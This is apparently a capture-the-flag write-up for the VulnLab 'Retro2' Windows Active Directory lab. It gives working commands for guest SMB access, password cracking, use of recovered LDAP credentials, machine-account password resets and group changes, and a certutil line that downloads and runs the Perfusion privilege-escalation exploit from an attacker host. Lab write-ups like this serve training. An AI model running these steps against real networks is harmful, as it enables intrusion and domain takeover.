---
title: Retro2
date: 2026-02-16T00:00:00
draft: false
sources: "VulnLab"
difficulties: Easy
tags: ["Windows", "Active Directory", "SMB Enumeration", "Guest Access", "BloodHound", "Computer Accounts", "RpcEptMapper"]
author: Anx
description: Retro2 is a Windows AD challenge involving guest SMB access to an MS Access database, LDAP credential recovery from VBA, and lateral movement via machine account abuse, concluding with a privilege escalation to SYSTEM through RpcEptMapper.
---

![](featured.png)

## Enumeration
### Nmap

We began the engagement by performing a full TCP port scan against the target:

```
sudo nmap -p- -sCV 10.10.127.218 -oA nmap/10.10.127.218-full-tcp

Nmap scan report for 10.10.127.218
Host is up (0.052s latency).
Not shown: 65521 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-02-15 12:37:41Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49172/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: BLN01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-02-15T12:38:30
|_  start_date: 2026-02-15T12:08:27
|_clock-skew: mean: -19m59s, deviation: 34m36s, median: -1s
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: BLN01
|   NetBIOS computer name: BLN01\x00
|   Domain name: retro2.vl
|   Forest name: retro2.vl
|   FQDN: BLN01.retro2.vl
|_  System time: 2026-02-15T13:38:33+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

```

The scan results indicated that the target was a Windows Server 2008 R2 Domain Controller named **BLN01.retro2.vl**.

Key exposed services included:
- Kerberos (88)
- LDAP (389)
- SMB (445)
- RPC services
- kpasswd (464)

The SMB OS discovery script confirmed:
- Hostname: BLN01
- Domain: retro2.vl
- OS: Windows Server 2008 R2 Datacenter SP1

### SMB

We enumerated SMB shares using guest access:

```bash
nxc smb 10.10.127.218 -u 'Guest' -p '' --shares
```

![](Pasted%20image%2020260216112103.png)

A share named **Public** was readable.

## FootHold

Inside the share, we found a Microsoft Access database file (staff.accdb) and downloaded it for offline analysis.

```bash
smbclient //10.10.127.218/Public -U "Guest"
```

![](Pasted%20image%2020260216112153.png)

### Cracking the Access Database

The file was password-protected.

![](Pasted%20image%2020260215154847.png)

We extracted the password hash and then performed a dictionary attack using John the Ripper::

```bash
office2john staff.accdb > accdbfile.hash

john --wordlist=/usr/share/wordlists/rockyou.txt accdbfile.hash
```

![](Pasted%20image%2020260215150528.png)

![](Pasted%20image%2020260215154918.png)

After cracking the password, we opened the database and inspected the embedded VBA macro.

The VBA code contained hardcoded domain credentials:

![](Pasted%20image%2020260215155038.png)

### LDAP and BloodHound Enumeration

We validated the credentials:

```bash
nxc smb 10.10.127.218 -u 'ldapreader' -p 'ppYaVcB5R' --shares
```

![](Pasted%20image%2020260216112748.png)

Then collected data for BloodHound:

```bash
nxc ldap 10.10.127.218 -d retro2.vl -u 'ldapreader' -p 'ppYaVcB5R' --bloodhound --dns-server 10.10.127.218 -c All
```

![](Pasted%20image%2020260216112914.png)

BloodHound analysis revealed three domain computer accounts.

![](Pasted%20image%2020260215233338.png)

The analysis revealed that the machine account FS01$ had permissions over ADMWS01$:
- GenericWrite
- ForceChangePassword

This is dangerous because ForceChangePassword allows resetting the target account password without knowledge of the current password being required. Basically, this gives full control over the target machine account if we get access to one of the FS0X computer accounts which was an easy task because both of them had the machine name as password:

```bash
nxc smb 10.10.127.218 -d retro2.vl -u 'fs01$' -p 'fs01'
```

![](Pasted%20image%2020260215234748.png)

> [!NOTE]
> Before continuing with the exploitation, the following line was added to the /etc/host file.
> ```
> 10.10.127.218   retro2.vl BLN01.retro2.vl
> ```

The credentials were valid; however, since the account had not been used for a long time, the machine password was out of sync with the domain controller. This is typical of pre-created computer accounts. In this case, we reset the password for FS01:

```bash
impacket-changepasswd 'retro2.vl/fs01$':'fs01'@retro2.vl -newpass Pa55w0rd -dc-ip BLN01.retro2.vl -p rpc-samr
```

![](Pasted%20image%2020260216123826.png)

Next, the computer was marked as Owned in BloodHound. Using the “Shortest Paths from Owned Objects” query, we identified that FS01 had ForceChangePassword rights over ADMWS01. ADMWS01, in turn, had AddSelf privileges on the Services group, which was also a member of the Remote Desktop Users group.

![](Pasted%20image%2020260216114404.png)

Using the privileges identified, we forced a password change for ADMWS01$:

```bash
net rpc password 'ADMWS01$' Pa55w0rd -U retro2.vl/'fs01$' -S BLN01.retro2.vl
```

![](Pasted%20image%2020260216124005.png)

And then, with the new credentials, we leveraged the compromised `ADMWS01$` account to add the "ldapreader" user to the **Services** group:

```bash
net rpc group addmem "Services" "ldapreader" -S BLN01.retro2.vl -U retro2.vl/'ADMWS01$'
```

![](Pasted%20image%2020260216133532.png)

We verified group membership of the ldapreader user:

```
ldapsearch -x -H ldap://10.10.127.218 \
-D "ldapreader" -w "ppYaVcB5R" \       
-b "CN=Services,CN=Users,DC=retro2,DC=vl" \   
"(objectClass=group)" member
```

![](Pasted%20image%2020260216134207.png)

At this point, the user had access to the server via RDP, so we connected using Remmina. It was necessary to set the TLS security level to 0; otherwise, the connection would fail.

![](Pasted%20image%2020260216134959.png)

![](Pasted%20image%2020260216134940.png)

![](Pasted%20image%2020260216135034.png)

## Privilege escalation

The host was running Windows Server 2008 R2, which is vulnerable to a privilege escalation issue involving improper permissions on the RPC Endpoint Mapper registry key, as described in the following research:
- Perfusion
- Windows Registry RpcEptMapper EoP research by itm4n

This vulnerability enables privilege escalation to **NT AUTHORITY\SYSTEM** by:
- Manipulating the `RpcEptMapper` registry key
- Triggering controlled DLL loading behavior

First, we downloaded and opened the project in Visual Studio.

> [!NOTE]
> If you are using a newer versión than 2019 you will need to install some packages.

![](Pasted%20image%2020260216153804.png)

Compiled the project.

![](Pasted%20image%2020260216154825.png)

And finally we uploaded and executed the exploit to spawn a SYSTEM shell session:

```bash
certutil.exe -urlcache -f http://10.8.8.46/Perfusion.exe Perfusion.exe
.\Perfusion.exe -c cmd -i
```

![](Pasted%20image%2020260216155459.png)